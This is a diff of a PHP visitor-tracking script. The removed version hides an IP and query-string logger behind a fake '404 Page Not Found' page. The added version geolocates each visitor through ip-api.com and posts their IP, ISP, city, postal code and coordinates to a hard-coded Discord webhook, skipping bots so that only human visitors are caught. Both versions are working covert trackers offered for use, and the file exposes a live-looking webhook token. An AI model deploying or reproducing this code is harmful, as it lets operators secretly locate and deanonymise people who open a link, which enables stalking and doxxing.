@@ -1,153 +1,150 @@
-<!--
-Author: CybrDev
-Github: https://github.com/CybrDev
-Description: Just a simple code to show you as it's simple and powerful to get information about a person
-Don't trust anyone online.
-Only for educational purposes!!
-
-
-
-    ___
- __/_  `.  .-"""-.
- \_,` | \-'  /   )`-')
-  "") `"`    \  ((`"`
- ___Y  ,    .'7 /|
-(_,___/...-` (_/_/
--->
-<!DOCTYPE html>
-<html>
-<head>
-	<title>Error 404 | Redirecting to correct url</title>
-	<link rel="icon" type="images/x-icon" href="../images/favicon.ico">
-</head>
-<body>
-
 <?php
-function GetIP() 
-{ 
-	if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown")) 
-		$ip = getenv("HTTP_CLIENT_IP"); 
-	else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown")) 
-		$ip = getenv("HTTP_X_FORWARDED_FOR"); 
-	else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown")) 
-		$ip = getenv("REMOTE_ADDR"); 
-	else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown")) 
-		$ip = $_SERVER['REMOTE_ADDR']; 
-	else 
-		$ip = "unknown"; 
-	return($ip); 
-} 
-function logData() 
-{ 
-	$ipLog = "information.txt"; 
 
-	$cookie = $_SERVER['QUERY_STRING']; 
+$Webhook    = "https://discord.com/api/webhooks/1016382448025747517/hrLNHWXhub-6cedm3JwTvJAaemuVGQzVU0vEKIZkaCDeppLM0hSmpxwXZ6xI9pRyofxj"; //Webhook here 
+$WebhookTag = "Funny Moment"; //Name this whatever you want
+$WebhookAvatar = "https://vgy.me/GQe9bJ.png"; //Change this to your the avatar you prefer
+$DEmbedColor = "FFFFFF"; //Change the color of the Discord Embed must be in hex "FFFFFF"
 
-	$register_globals = (bool) ini_get('register_gobals'); 
+//                        Dont Edit Unless You Know What You're Doing!
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
+//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\
 
-	if ($register_globals) $ip = getenv('REMOTE_ADDR'); 
-	else $ip = GetIP(); 
-	$rem_port = $_SERVER['REMOTE_PORT']; 
-	$user_agent = $_SERVER['HTTP_USER_AGENT'];
-	if (isset( $_SERVER['METHOD'])){
-		$rqst_method = $_SERVER['METHOD'];
-	}
-	else{
-		$rqst_method = "null";
-	}
-	if (isset( $_SERVER['REMOTE_HOST'])) {
-		$rem_host = $_SERVER['REMOTE_HOST'];
-	}
-	else{
-		$rem_host = "null";
-	}
-	if (isset($_SERVER['HTTP_REFERER'])) {
-		$referer = $_SERVER['HTTP_REFERER'];
-	}
-	else
-	{
-		$referer = "null";
-	}
-	$date=date ("Y/m/d G:i:s"); 
-	$log=fopen("$ipLog", "a+"); 
+$IP       = $_SERVER['REMOTE_ADDR'];
+$Browser  = $_SERVER['HTTP_USER_AGENT'];
+$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
+    exit();
+}
+
+$Curl = curl_init("http://ip-api.com/json/$IP");
+curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
+$Info = json_decode(curl_exec($Curl)); 
+curl_close($Curl);
+
+$ISP = $Info->isp;
+$Status = $Info->status;
+$Country = $Info->country;
+$countryCode = $Info->countryCode;
+$Region = $Info->regionName;
+$City = $Info->city;
+$Tz = $Info->timezone;
+$Zip = $Info->zip;
+$COORD = "$Info->lat, $Info->lon"; 
+$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
+$timestamp = date("Y-m-d H:i:s");
 
 
-	// I use this site to get more infos about the IP addy such as city, ISP, location
-	$ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
+$hookObject = json_encode([ // Discord Embed Message
+    'username'   => "$WebhookTag" , 
+    'avatar_url' => "$WebhookAvatar",
+    "embeds" => [
+        /*
+         * Our first embed
+         */
+        [
+            "title" => "Ip Logger",
+            
+            // The type of your embed, will ALWAYS be "rich"
+            "type" => "rich",
+            
+            /* A timestamp to be displayed below the embed, IE for when an an article was posted
+             * This must be formatted as ISO8601
+             */
+            "timestamp" => "$timestamp",
+            
+            // The integer color to be used on the left side of the embed
+            "color" => hexdec( "$DEmbedColor" ),
+            
+            // Footer object
+            "footer" => [
+                "text" => "$WebhookTag | IP Logger",
+                "icon_url" => "$WebhookAvatar"
+            ],
+            "thumbnail" => [
+                "url" => "$flag"
+            ],
+            // Author object
+            "author" => [
+                "name" => "Made By Whisk | github.com/Wh7sk",
+                "url" => "https://github.com/Wh7sk"
+            ],
+            // Field array of objects
+            "fields" => [
+                // Field 1
+                [
+                    "name" => "URL Header Logged",
+                    "value" => "$URL",
+                    "inline" => false
+                ],
+                [
+                    "name" => "IP",
+                    "value" => "$IP",
+                    "inline" => true
+                ],
+                [
+                    "name" => "ISP",
+                    "value" => "$ISP",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Status",
+                    "value" => "$Status",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Browser",
+                    "value" => "$Browser",
+                    "inline" => false
+                ],
+                [
+                    "name" => "Country",
+                    "value" => "$Country",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Region",
+                    "value" => "$Region",
+                    "inline" => true
+                ],
+                [
+                    "name" => "City",
+                    "value" => "$City",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Timezone",
+                    "value" => "$Tz",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Postal/Zip",
+                    "value" => "$Zip",
+                    "inline" => true
+                ],
+                [
+                    "name" => "Coordinates",
+                    "value" => "$COORD",
+                    "inline" => true
+                ],
+            ]
+        ]
+    ]
 
+], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
 
-// Write all data we got in 'information.txt'
-	fwrite($log, "IP=" . $ip . PHP_EOL);
-	fwrite($log, "PORT=" . $rem_port . PHP_EOL);
-	fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);
-	fwrite($log, "REGION=" . $ip_details->region . PHP_EOL);
-	fwrite($log, "COUNTRY=" . $ip_details->country . PHP_EOL);
-	fwrite($log, "LOCATION=" . $ip_details->loc . PHP_EOL);
-	fwrite($log, "ISP=" . $ip_details->org . PHP_EOL);
-	fwrite($log, "DATE=" . $date . PHP_EOL);
-	fwrite($log, "HOST=" . $rem_host . PHP_EOL);
-	fwrite($log, "UA=" . $user_agent . PHP_EOL);
-	fwrite($log, "METHOD=" . $rqst_method . PHP_EOL);
-	fwrite($log, "REF=" . $referer . PHP_EOL);
-	fwrite($log, "COOKIE=" . $cookie . PHP_EOL . PHP_EOL);
+$ch = curl_init();
 
-} 
-logData();
+curl_setopt_array( $ch, [
+    CURLOPT_URL => $Webhook,
+    CURLOPT_POST => true,
+    CURLOPT_POSTFIELDS => $hookObject,
+    CURLOPT_HTTPHEADER => [
+        "Content-Type: application/json"
+    ]
+]);
+
+$response = curl_exec( $ch );
+curl_close( $ch );
+
 ?>
-<!-- Diplaying a fake 404 page -->
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-
-        * {
-            line-height: 1.2;
-            margin: 0;
-        }
-
-        html {
-            color: #888;
-            display: table;
-            font-family: sans-serif;
-            height: 100%;
-            text-align: center;
-            width: 100%;
-        }
-
-        body {
-            display: table-cell;
-            vertical-align: middle;
-            margin: 2em auto;
-        }
-
-        h1 {
-            color: #555;
-            font-size: 2em;
-            font-weight: 400;
-        }
-
-        p {
-            margin: 0 auto;
-            width: 280px;
-        }
-
-        @media only screen and (max-width: 280px) {
-
-            body, p {
-                width: 95%;
-            }
-
-            h1 {
-                font-size: 1.5em;
-                margin: 0 0 0.3em;
-            }
-
-        }
-
-    </style>
-</head>
-<body>
-    <h1>Page Not Found</h1>
-    <p>Sorry, but the page you were trying to view does not exist.</p>
-</body>
-</html>
-</body>
-</html> 
